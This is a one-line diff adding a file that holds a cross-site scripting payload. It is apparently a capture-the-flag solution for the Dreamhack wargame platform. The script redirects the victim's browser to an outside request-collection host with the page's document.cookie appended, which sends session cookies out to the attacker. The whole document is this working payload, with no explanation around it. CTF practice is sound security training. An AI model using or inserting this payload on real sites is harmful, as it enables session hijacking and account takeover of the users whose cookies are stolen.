@@ -1,0 +1,1 @@
+<script>location.href ="https://dikqhwv.request.dreamhack.games/?"+document.cookie</script>
